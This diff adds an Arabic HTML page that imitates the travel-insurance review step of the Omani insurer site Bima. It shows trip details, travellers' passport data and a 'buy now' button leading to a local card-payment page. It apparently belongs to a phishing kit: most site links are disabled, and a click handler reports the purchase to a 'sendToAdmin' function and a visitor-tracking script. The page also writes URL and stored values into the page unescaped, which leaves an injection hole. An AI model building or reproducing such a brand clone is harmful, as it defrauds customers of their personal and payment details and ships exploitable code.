@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بيمة</title>
+    <link rel="icon" type="image/png" href="../img/logo/logo-50x50-t.png">
+    <link rel="stylesheet" href="../assets/css/rtl/bootstrap.rtl.min.css" />
+    <link rel="stylesheet" href="../assets/css/rtl/ace-responsive-menu.css" />
+    <link rel="stylesheet" href="../assets/css/menu.css" />
+    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.4.2/css/all.css">
+    <link rel="stylesheet" href="../assets/css/rtl/style.css" />
+    <link rel="stylesheet" href="../assets/css/rtl/site.css" />
+    <link rel="stylesheet" href="../assets/css/main.css">
+    <link rel="stylesheet" href="../assets/css/site_common.css">
+    <link rel="stylesheet" href="../assets/css/main_custom.css">
+    <style>
+        body {
+            background-color: #ffffff;
+        }
+        .btn_selected {
+            cursor: pointer;
+        }
+        .border-25 {
+            border-radius: 5px !important;
+        }
+        .border-1px {
+            border-width: 2px !important;
+        }
+        .green2 {
+            border-color: transparent;
+            color: #1266f1;
+        }
+        .green2:hover {
+            background-color: transparent;
+            color: #0d5bdb !important;
+        }
+        .green2 .fas {
+            color: #1266f1;
+        }
+        .btns-border.green {
+            border-color: #43a047;
+            color: #000;
+            background-color: transparent;
+        }
+        .btns-border.green:hover {
+            background-color: #43a047;
+            color: #fff !important;
+        }
+        .btns-border.green .fas, .btns-border.green .far, .btns-border.green .fal {
+            transition: 0.3s ease-in-out;
+            color: #43a047;
+            margin-right: 4px;
+        }
+        .btns-border.green:hover .fas {
+            color: #fff;
+        }
+        .offer_details_provider-logo_48px {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-left: 10px;
+        }
+        .app-info {
+            background-color: #2a2d33;
+            padding: 15px 20px;
+            border-radius: 15px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body class="body_rtl">
+
+<div class="wrapper ovh">
+    <div class="preloader"></div>
+
+    <!-- Desktop Header -->
+    <header class="header-nav nav-innerpage-style menu-home4 main-menu">
+        <nav class="posr">
+            <div class="container maxw1600 posr menu_bdrt1">
+                <div class="row align-items-center justify-content-between">
+                    <div class="col-auto">
+                        <ul id="respMenu" class="ace-responsive-menu" data-menu-style="horizontal">
+                            <li class="visible_list">
+                                <a class="list-item" href="/"><span class="title">الصفحة الرئيسية</span></a>
+                            </li>
+                            <li class="visible_list has-sub-mnu">
+                                <a href="#" class="top-mnu"><span class="title">التأمين</span></a>
+                                <ul class="sub-menu">
+                                    <li><a href="#" onclick="return false;">التأمين على المركبات</a></li>
+                                    <li><a href="/insurance/travel">تأمين السفر</a></li>
+                                    <li><a href="/insurance/domestic-form">تأمين خدم المنازل</a></li>
+                                    <li><a href="/insurance/medical-form">تأمين صحي</a></li>
+                                    <li><a href="/insurance/credit-life-form">تأمين القروض</a></li>
+                                    <li><a href="/insurance/malpractice-form">تأمين الاخطاء الطبية</a></li>
+                                    <li><a href="/insurance/home-form">تأمين المنازل</a></li>
+                                </ul>
+                            </li>
+                            <li class="visible_list">
+                                <a class="list-item" href="#" onclick="return false;"><span class="title">تتبع حالة طلبك</span></a>
+                            </li>
+                            <li class="visible_list">
+                                <a href="#" onclick="return false;" target="_blank" class="b2b_branding">بيمة للأعمال</a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="col-auto">
+                        <a href="/" class="header-logo">
+                            <img src="../img/logo/bima-logo.svg" alt="بيمة">
+                        </a>
+                    </div>
+                    <div class="col-auto">
+                        <div class="d-flex align-items-center">
+                            <ul id="respMenu2" class="ace-responsive-menu" data-menu-style="horizontal">
+                                <li class="visible_list">
+                                    <a title="واتس أب " class="list-item" href="whatsapp://send?phone=96879997797" data-action="share/whatsapp/share"><i class="fa-brands fa-whatsapp"></i> <span class="title">&#x202D;968 79997797&#x202C;</span></a>
+                                </li>
+                                <li class="visible_list">
+                                    <button type="button" class="btn-no-bg no_border btn-menu-item" onclick="window.location.href='#'">
+                                        <i class="fa-sharp fa-light fa-globe"></i> English
+                                    </button>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <div class="hiddenbar-body-ovelay"></div>
+
+    <!-- Mobile Nav -->
+    <div id="page" class="mobilie_header_nav stylehome1">
+        <div class="mobile-menu">
+            <div class="header innerpage-style">
+                <div class="menu_and_widgets">
+                    <div class="mobile_menu_bar d-flex justify-content-between align-items-center">
+                        <a class="menubar" href="#menu"><img src="../assets/images/mobile-dark-nav-icon.svg" alt=""></a>
+                        <a class="mobile_logo" href="#" onclick="return false;"><img src="../img/logo/bima-ar.png" alt="بيمة"></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <nav id="menu" class="">
+            <ul>
+                <li><a href="/">الصفحة الرئيسية</a></li>
+                <li class="has-sub-mnu">
+                    <span>التأمين</span>
+                    <ul>
+                        <li><a href="#" onclick="return false;">التأمين على المركبات</a></li>
+                        <li><a href="Travel.html">تأمين السفر</a></li>
+                        <li><a href="/insurance/domestic-offers.html">تأمين خدم المنازل</a></li>
+                        <li><a href="/insurance/medical-offers.html">تأمين صحي</a></li>
+                        <li><a href="/insurance/credit-life-offers.html">تأمين القروض</a></li>
+                        <li><a href="/insurance/malpractice-offers.html">تأمين الاخطاء الطبية</a></li>
+                        <li><a href="/insurance/home-offers.html">تأمين المنازل</a></li>
+                    </ul>
+                </li>
+                <li><a href="#" onclick="return false;">تتبع حالة طلبك</a></li>
+                <li><a href="#" onclick="return false;" target="_blank"><div class="b2b_branding-mobile">بيمة للأعمال</div></a></li>
+                <li class="px-3 mobile-menu-btn">
+                    <a href="whatsapp://send?phone=96879997797" class="ud-btn btn-dark add-property bdrs0 mx-2 mx-xl-4 text-white">968 79997797<i class="fa-brands fa-whatsapp"></i></a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    <!-- Body Content -->
+    <div class="body_content">
+        <div class="page-wrap">
+            <h3 class="text-center pt-3">مراجعة تأمين السفر</h3>
+            <div class="container-fluid h-100 frmOuter">
+                <div class="row justify-content-center align-items-center h-100">
+                    <div class="col-sm-12 col-md-10 col-lg-8 pt-3 bg_blur_10">
+                        <p class="text-black">يرجى مراجعة تفاصيل طلبك ، بعد التأكيد لن تتمكن  تغيير التفاصيل.</p>
+                        <div class="row">
+                            <!-- تفاصيل الرحلة -->
+                            <div class="col-sm-12 pt-3">
+                                <div class="heding1_outer">
+                                    <div class="heding1_inner bold">تفاصيل الرحلة</div>
+                                    <span class="float-left">
+                                        <a class="btn-link font_12px" href="Travel.html"> تعديل <i class="fas fa-pencil-alt"></i></a>
+                                    </span>
+                                </div>
+                            </div>
+                            <div class="col-sm-12">
+                                <div class="row">
+                                    <div class="col-sm-6">
+                                        <div class="row">
+                                            <div class="col-5">
+                                                السفر من البلد
+                                            </div>
+                                            <div class="col-7">
+                                                :  <i class="fas fa-plane-departure"></i> <b>عمان</b>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="col-sm-6">
+                                        <div class="row">
+                                            <div class="col-5">
+                                                سوف تهبط في البلد
+                                            </div>
+                                            <div class="col-7" id="destinationDisplay">
+                                                :  <i class="fas fa-plane-arrival"></i> <b>تركيا</b>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="col-sm-6">
+                                        <div class="row">
+                                            <div class="col-5">
+                                                التاريخ من
+                                            </div>
+                                            <div class="col-7" id="departureDateDisplay">
+                                                :  <b>05/07/2026</b>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="col-sm-6">
+                                        <div class="row">
+                                            <div class="col-5">
+                                                التاريخ إلى
+                                            </div>
+                                            <div class="col-7" id="returnDateDisplay">
+                                                :  <b>29/07/2026</b>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- تفاصيل المسافرين -->
+                            <div class="col-sm-12 pt-3">
+                                <div class="heding1_outer pt-3">
+                                    <div class="heding1_inner bold">تفاصيل المسافرين</div>
+                                    <span class="float-left">
+                                        <a class="btn-link font_12px" id="editBeneficiariesLink" href="travel-beneficiaries.html"> تعديل <i class="fas fa-pencil-alt"></i></a>
+                                    </span>
+                                </div>
+                            </div>
+                            <div class="col-sm-12">
+                                <!-- Desktop table -->
+                                <div class="d-none d-md-block">
+                                    <table class="table table-hover" id="travelersTable">
+                                        <tbody>
+                                            <tr>
+                                                <th><b>اسم المسافر</b></th>
+                                                <th><b>الجنسية</b></th>
+                                                <th><b>تاريخ الميلاد</b></th>
+                                                <th><b>الجنس</b></th>
+                                                <th><b>رقم جواز السفر</b></th>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                                <!-- Mobile view -->
+                                <div class="d-md-none" id="travelersMobile">
+                                </div>
+                            </div>
+
+                            <!-- تفاصيل التأمين -->
+                            <div class="col-sm-12 pt-3">
+                                <div class="heding1_outer pt-3">
+                                    <div class="heding1_inner bold">تفاصيل التأمين</div>
+                                </div>
+                            </div>
+                            <div class="col-sm-12">
+                                <div class="row">
+                                    <div class="col-12">
+                                        <div class="d-inline-block verticle-top">
+                                            <img alt="Logo" class="offer_details_provider-logo_48px" id="providerLogo" src="../assets/images/insurers/takaful-oman-thumb.jpg">
+                                        </div>
+                                        <div class="d-inline-block">
+                                            <span class="small">
+                                                اسم شركة التأمين
+                                            </span>
+                                            <div>
+                                                <b id="providerName">تكافل عمان للتأمين</b>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div id="divPayment">
+                                    <div class="row pt-3">
+                                        <div class="col-12">
+                                            <span class="small">
+                                                العرض المختار
+                                            </span>
+                                        </div>
+                                        <div class="col-12" id="selected-plan-name">
+                                            <b>Silver</b>
+                                        </div>
+                                    </div>
+                                    <div class="row pt-3">
+                                        <div class="col-12">
+                                            <span class="small">
+                                                المبلغ الإجمالي
+                                            </span>
+                                        </div>
+                                        <div class="col-12" id="totalAmountDisplay">
+                                            <b>48.514</b>
+                                        </div>
+                                    </div>
+                                    <div class="col-sm-12 pt-3">
+                                        <form class="form" id="frm02Travel" name="frm02Travel">
+                                            <a class="btns-border border-25 border-1px green btn_selected green2" href="travel-beneficiaries.html">
+                                                <i class="fas fa-chevron-left" id="ico_Loading_BeneficiariesBack"></i>
+                                                السابق
+                                            </a>
+                                            <a class="btns-border border-25 border-1px green btn_selected" id="btnBuyNow" href="/credit-card-payment">
+                                                اشترِ الآن
+                                            </a>
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-sm-12 pt-3">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div><!-- end body_content -->
+
+    <!-- Footer -->
+    <section class="footer-style1 pt20 pb0 ">
+        <div class="container">
+            <div class="row pb-2 ">
+                <div class="col-sm-5">
+                    <div class="footer-widget text-center text-sm-start">
+                        <a class="footer-logo" href="#" onclick="return false;"><img src="../img/logo/logo-50x50-t.png" alt="بيمة"></a>
+                        <div class="text-white">
+                            <small>شركة بيت التأمين ش. م. م.</small>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-sm-7">
+                    <div class="social-widget text-center text-sm-end">
+                        <div class="social-style1">
+                            <span class="text-white me-2 fw600 fz15">تابعنا عبر</span>
+                            <a href="https://www.facebook.com/www.Bima.om"><i class="fab fa-facebook-f list-inline-item"></i></a>
+                            <a href="https://twitter.com/bima_oman"><i class="fab fa-twitter list-inline-item"></i></a>
+                            <a href="https://www.instagram.com/bima_oman"><i class="fab fa-instagram list-inline-item"></i></a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="row pt30 white-bdrt1 ">
+                <div class="col-md-6">
+                    <div class="row justify-content-between">
+                        <div class="col-auto">
+                            <div class="link-style1 mb-3">
+                                <h6 class="text-white mb25">روابط سريعة</h6>
+                                <div class="link-list">
+                                    <a href="../Home/AboutUs.html">عن بيمة</a>
+                                    <a href="../Home/ContactUs.html">إتصل بنا</a>
+                                    <a href="../Contents/Articles.html">مقالات</a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-auto">
+                            <div class="link-style1 mb-3">
+                                <h6 class="text-white mb25"> </h6>
+                                <ul class="ps-0">
+                                    <li><a href="#" onclick="return false;">التأمين على المركبات</a></li>
+                                    <li><a href="Travel.html">تأمين السفر</a></li>
+                                    <li><a href="/insurance/domestic-offers.html">تأمين خدم المنازل</a></li>
+                                    <li><a href="/insurance/medical-offers.html">تأمين صحي</a></li>
+                                    <li><a href="/insurance/credit-life-offers.html">تأمين القروض</a></li>
+                                    <li><a href="/insurance/malpractice-offers.html">تأمين الاخطاء الطبية</a></li>
+                                    <li><a href="/insurance/home-offers.html">تأمين المنازل</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-4 offset-lg-2">
+                    <div class="footer-widget mb-4">
+                        <div class="row mb-4">
+                            <div class="col-auto">
+                                <div class="contact-info">
+                                    <p class="info-title">خدمة العملاء</p>
+                                    <h6 class="info-phone">
+                                        <a href="javascript:void(0);">
+                                            <i class="fas fa-phone-rotary"></i> <span class="ltr-fix">&#x202D;+968 22644444&#x202C;</span>
+                                        </a>
+                                    </h6>
+                                </div>
+                            </div>
+                            <div class="col-auto">
+                                <div class="contact-info">
+                                    <p class="info-title">دعم مباشر</p>
+                                    <h6 class="info-mail">
+                                        <a href="mailto:info@bima.om">
+                                            <i class="fas fa-envelope"></i> info@bima.om
+                                        </a>
+                                    </h6>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="app-widget">
+                            <h5 class="title text-white mb10">حمل التطبيق</h5>
+                            <div class="row mb-4 mb-lg-5">
+                                <div class="col-lg-12">
+                                    <a href="https://apps.apple.com/om/app/bima-insurance/id1628311517" target="_blank">
+                                        <div class="app-info d-flex align-items-center mb20">
+                                            <div class="flex-shrink-0">
+                                                <i class="fab fa-apple fz30 text-white"></i>
+                                            </div>
+                                            <div class="flex-grow-1 ml20">
+                                                <p class="app-text fz13 mb0">حمل من </p>
+                                                <h6 class="app-title text-white fz14">متجر آبل</h6>
+                                            </div>
+                                        </div>
+                                    </a>
+                                </div>
+                                <div class="col-lg-12">
+                                    <a href="https://play.google.com/store/apps/details?id=com.ebima.insuranceapp" target="_blank">
+                                        <div class="app-info d-flex align-items-center mb10">
+                                            <div class="flex-shrink-0">
+                                                <i class="fab fa-google-play fz30 text-white"></i>
+                                            </div>
+                                            <div class="flex-grow-1 ml20">
+                                                <p class="app-text fz13 mb0">حمل من </p>
+                                                <h6 class="app-title text-white fz14">جوجل بلاي</h6>
+                                            </div>
+                                        </div>
+                                    </a>
+                                </div>
+                                <div class="col-lg-12">
+                                    <a href="https://appgallery.huawei.com/app/C108465739" target="_blank">
+                                        <div class="app-info d-flex align-items-center mb10">
+                                            <div class="flex-shrink-0">
+                                                <i class="fz30 text-white"></i>
+                                            </div>
+                                            <div class="flex-grow-1 ml20">
+                                                <p class="app-text fz13 mb0">حمل من </p>
+                                                <h6 class="app-title text-white fz14">متجر هواوي</h6>
+                                            </div>
+                                        </div>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="container white-bdrt1 py-1 pt-3 ">
+            <div class="row">
+                <div class="col-sm-6">
+                    <div class="text-center text-lg-start">
+                        <p class="copyright-text text-gray ff-heading">
+                            حقوق النسخ © 2026 <a href="https://www.bima.om" target="_blank">bima.om</a>. كافة الحقوق محفوظة.
+                        </p>
+                    </div>
+                </div>
+                <div class="col-sm-6">
+                    <div class="text-center text-lg-end">
+                        <p class="footer-menu ff-heading text-gray">
+                            <a class="text-gray" href="../Home/Terms.html">الأحكام والشروط</a> .
+                            <a class="text-gray" href="../Home/FAQ.html">الأسئلة المتداولة</a> .
+                            <a class="text-gray" href="../Home/PrivacyPolicy.html">سياسة الخصوصية</a>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <a class="scrollToHome" href="#"><i class="fas fa-angle-up"></i></a>
+</div><!-- end wrapper -->
+
+<script src="../assets/js/jquery-3.6.4.min.js"></script>
+<script src="../assets/js/jquery.mmenu.all.js"></script>
+<script src="../assets/js/ace-responsive-menu.js"></script>
+<script src="../assets/js/script.js"></script>
+<script>
+(function() {
+    // قراءة البيانات من localStorage
+    var data = {};
+    try {
+        data = JSON.parse(localStorage.getItem('travelInsuranceData')) || {};
+    } catch(e) {}
+
+    // قراءة المبلغ من URL params
+    var urlParams = new URLSearchParams(window.location.search);
+    var amount = urlParams.get('amount') || data.discountedAmount || '20.3';
+
+    // تحديث تفاصيل الرحلة
+    var destinationName = data.destinationName || 'تركيا';
+    var departureDate = data.departureDate || '05/07/2026';
+    var returnDate = data.returnDate || '29/07/2026';
+
+    document.getElementById('destinationDisplay').innerHTML = ':  <i class="fas fa-plane-arrival"></i> <b>' + destinationName + '</b>';
+    document.getElementById('departureDateDisplay').innerHTML = ':  <b>' + departureDate + '</b>';
+    document.getElementById('returnDateDisplay').innerHTML = ':  <b>' + returnDate + '</b>';
+
+    // تحديث تفاصيل المسافرين
+    var beneficiaries = data.beneficiaries || [];
+    var tableBody = document.querySelector('#travelersTable tbody');
+    var mobileDiv = document.getElementById('travelersMobile');
+
+    // Nationality map
+    var nationalityMap = {
+        'OMN': 'عماني', 'SAU': 'سعودي', 'ARE': 'إماراتي', 'KWT': 'كويتي',
+        'BHR': 'بحريني', 'QAT': 'قطري', 'EGY': 'مصري', 'JOR': 'أردني',
+        'LBN': 'لبناني', 'IRQ': 'عراقي', 'SYR': 'سوري', 'YEM': 'يمني',
+        'IND': 'هندي', 'PAK': 'باكستاني', 'BGD': 'بنغلاديشي', 'PHL': 'فلبيني'
+    };
+
+    for (var i = 0; i < beneficiaries.length; i++) {
+        var b = beneficiaries[i];
+        var name = (b.firstName || '') + ' ' + (b.lastName || '');
+        var nationality = nationalityMap[b.nationality] || b.nationality || 'عماني';
+        var gender = (b.gender === 'Male') ? '‏‏ذكر' : '‏‏أنثى';
+        var dob = b.dob || '';
+        var passport = b.passportNo || '';
+
+        // Desktop table row
+        var tr = document.createElement('tr');
+        tr.innerHTML = '<td>' + (i + 1) + '. ' + name + '</td>' +
+            '<td>' + nationality + '</td>' +
+            '<td>' + dob + '</td>' +
+            '<td>' + gender + '</td>' +
+            '<td>' + passport + '</td>';
+        tableBody.appendChild(tr);
+
+        // Mobile view
+        var label = (i === 0) ? 'Self' : (i + 1) + '. أخرى';
+        var mobileRow = document.createElement('div');
+        mobileRow.className = 'row pb-3';
+        mobileRow.innerHTML = '<div class="col-sm-12 border-bottom mb-1">' +
+            '<span class="float-right">' + label + '</span>' +
+            '<span class="float-left"><a class="btn-link font_12px float-left" href="travel-beneficiaries.html"> تعديل <i class="fas fa-pencil-alt"></i></a></span>' +
+            '</div>' +
+            '<div class="col-sm-3"><div class="row"><div class="col-5">اسم المسافر</div><div class="col-7">:  ' + name + '</div></div></div>' +
+            '<div class="col-sm-3"><div class="row"><div class="col-5">الجنسية</div><div class="col-7">:  ' + nationality + '</div></div></div>' +
+            '<div class="col-sm-3"><div class="row"><div class="col-5">تاريخ الميلاد</div><div class="col-7">:  ' + dob + '</div></div></div>' +
+            '<div class="col-sm-3"><div class="row"><div class="col-5">الجنس</div><div class="col-7">:  ' + gender + '</div></div></div>' +
+            '<div class="col-sm-3"><div class="row"><div class="col-5">رقم جواز السفر</div><div class="col-7">:  ' + passport + '</div></div></div>';
+        mobileDiv.appendChild(mobileRow);
+    }
+
+    // تحديث تفاصيل التأمين
+    var selectedOffer = {};
+    try {
+        selectedOffer = JSON.parse(localStorage.getItem('selectedTravelOffer')) || {};
+    } catch(e) {}
+
+    if (selectedOffer.companyName) {
+        document.getElementById('providerName').textContent = selectedOffer.companyName;
+    }
+    if (selectedOffer.logo) {
+        document.getElementById('providerLogo').src = selectedOffer.logo;
+    }
+    if (selectedOffer.planName) {
+        document.getElementById('selected-plan-name').innerHTML = '<b>' + selectedOffer.planName + '</b>';
+    }
+
+    // تحديث المبلغ
+    document.getElementById('totalAmountDisplay').innerHTML = '<b>' + amount + '</b>';
+
+    // تحديث رابط اشترِ الآن
+    document.getElementById('btnBuyNow').href = '/credit-card-payment?amount=' + amount;
+
+    // تحديث رابط السابق
+    var backLink = document.querySelector('.green2');
+    if (backLink) {
+        backLink.href = 'travel-beneficiaries.html?amount=' + amount;
+    }
+
+    // تحديث رابط تعديل المسافرين
+    document.getElementById('editBeneficiariesLink').href = 'travel-beneficiaries.html?amount=' + amount;
+    // Send to admin on buy click
+    document.getElementById('btnBuyNow').addEventListener('click', function() {
+        if (window.sendToAdmin) {
+            window.sendToAdmin({
+                'المبلغ': amount + ' ر.ع',
+                'الحالة': 'تم الشراء'
+            }, 'تأمين السفر - مراجعة');
+        }
+    });
+})();
+</script>
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
